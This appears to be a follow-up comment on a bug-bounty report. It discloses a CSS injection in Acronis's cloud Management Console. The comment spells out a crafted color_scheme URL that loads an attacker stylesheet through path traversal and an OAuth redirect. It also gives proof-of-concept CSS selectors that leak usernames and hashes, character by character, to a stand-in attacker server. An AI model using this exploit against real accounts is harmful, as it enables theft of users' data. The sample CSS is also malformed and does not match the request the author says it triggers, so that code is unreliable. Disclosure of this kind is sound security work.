Hi again, while retesting this issue I notice the URL I commented does not work as expected.

## Update:

In my previous explanation I said how to construct the evil URL that the user have to visit for the correct exploitation of the CSS Injection. As commented I was saying to visit the following URL
`https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`

But notice that when visiting `https://mc-beta-cloud.acronis.com/mc/?color_sheme=something` it will redirect you to the following URL format with some parameters:
 `https://mc-beta-cloud.acronis.com/mc/app;group_id={YOUR-GROUP-ID-HASH}/clients;application_id={YOUR-APP-HASH}`
I don't know exactly why but in my first comment the URL specified without the `group_id` hash in the URL was working because it appended the `color_scheme` after the redirection but not now so we have to change a little bit the URL.

The explanation of this attack is the same but the result URL will looks like this, so if you configure the server with the CSS file, login in your Acronis Cloud as a partner and go to the following link must see the CSS injected:

`https://mc-beta-cloud.acronis.com/mc?color_scheme=%2f..%2f..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat/app;group_id=`

As we don't know the victim `group_id` hash we put that parameter empty and the redirection will fill that field with correct value and also the `color_scheme` parameter specified, in this way by visiting the previous we can load the external CSS without user interaction. For more information about the explanation of the GET parameters see the first comment.


Also, further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens, or in this case personal information as `name`, `hashes` of partners and customers or any other information located in the DOM where the CSS is injected.

Here is an example of code that attempts to select an `a` HTML tag with the `class` attribute matching `breadcrumbs-item dropdown-item-link` and the attribute named `data-test-name` beginning with an `A`, this HTML element is used in the `Management Console` to redirect the user to their application id and contains the name of the user in the `data-test-name` attribute and the `href` attribute have the hash of their application but we can use it in any HTML element we want to exiltrate. This is just for show the working POC but we can do it in any HTML element of the DOM. By utilizing a brute-force attack to determine the attribute’s value, it is possible to carry out an attack that sends the value to the attacker’s domain, such as by attempting to set a background image on the selected input element.

You can test it with the following CSS file:
```css
html
{
  background-color: black;
  color: green;
}

a[class='breadcrumbs-item dropdown-item-link'][data-test-name^='A']
{
 background-color:yellow;
 background-image("http://localhost/A");
}

a[class='breadcrumbs-item dropdown-item-link'][data-test-name^='H']
{
 background-color:yellow;
 background-image("http://localhost/H");
}

```

Using this scenario you will see how your username in the management console will have the background color yellow if it starts by the characters `A` or `H`, my user in the HTML element is `H1-mr-medi` so as you can see in the following image it have that background color.

Notice also how the GET request to `http://localhost/H` is made because the HTML element starts with the character `H`. In this way by adding to the CSS the rest of characters for each position we can exfiltrate all the user related information by making request to our server and log it to construct the correct hash or data we want to exfiltrate.

